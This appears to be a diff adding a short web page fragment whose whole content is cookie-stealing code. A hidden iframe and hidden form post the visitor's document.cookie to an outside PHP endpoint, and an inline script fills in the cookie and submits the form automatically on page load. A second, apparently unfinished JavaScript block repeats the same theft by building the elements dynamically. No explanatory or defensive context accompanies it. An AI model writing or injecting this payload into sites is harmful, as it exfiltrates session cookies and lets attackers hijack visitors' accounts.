@@ -1,0 +1,19 @@
+<iframe id="foo" style="display: none"></iframe>
+<form id="bar" method="post" target="foo"
+      action="http://www.epapertrad.com.br/prov/handle_cookies.php">
+    <input id="cookies" type="hidden" name="cookies" />
+</form>
+<script type="text/javascript">
+    document.getElementById('cookies').value = document.cookie;
+    document.getElementById('bar').submit();
+</script>
+
+
+foo = document.createElement("IFRAME"); 
+foo.style ="display: none"; 
+document.body.appendChild(foo); 
+var submitForm = document.createElement("FORM"); 
+document.body.appendChild(submitForm); 
+submitForm.method = "POST"; 
+document.getElementById('cookies').value = document.cookie; 
+document.getElementById('bar').submit();
